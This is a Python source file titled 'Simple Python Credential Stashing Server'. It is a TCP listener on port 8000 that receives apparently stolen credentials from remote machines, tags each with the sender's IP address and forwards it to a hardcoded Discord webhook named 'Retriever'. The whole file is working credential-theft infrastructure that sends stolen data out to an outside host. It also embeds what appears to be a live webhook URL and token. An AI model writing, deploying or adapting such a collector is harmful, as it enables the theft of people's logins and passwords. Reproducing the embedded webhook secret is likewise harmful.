### Simple Python Credential Stashing Server ###
import socket
import base64
import threading
import requests
from datetime import datetime

url = "https://discord.com/api/webhooks/892954300492431381/JtSllHcnrIcvrK-txc9AC9CNj8zqCh6Xx-4UOYRQ7VEB8qBONU7aIzsjCB-AWU4x11wz"
port = 8000

def fwd_discord(msg):
    split_msg = msg.strip(" ") 
    split_msg = msg.split(":")
    formatted_msg = (f"{split_msg[0]} | {split_msg[1]}:{split_msg[2]}")
    print(f"Sending : {formatted_msg}")

    post_thing = {}
    data = {
        "content" : formatted_msg,
        "username" : "Retriever"
    }
    result = requests.post(url, json = data)
    try:
        result.raise_for_status()
    except requests.exceptions.HTTPError as err:
        print(err)
    else:
        print("Payload delivered successfully, code {}.".format(result.status_code))

def handle(client_sock, addr):
    msg_from_client = client_sock.recv(1024)
    msg = msg_from_client.decode()
    prnt_msg = (f"{addr[0]} : {msg}")
    fwd_discord(prnt_msg)
    return()

def main():
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.bind(("", port))
    server_sock.listen()
    print("Server Is Listening")
    while True:
        (client_sock, addr) = server_sock.accept() #Blockin`
        thread = threading.Thread(target = handle, args = (client_sock,addr,))
        thread.start()
        thread.join()
        client_sock.close()
    
main()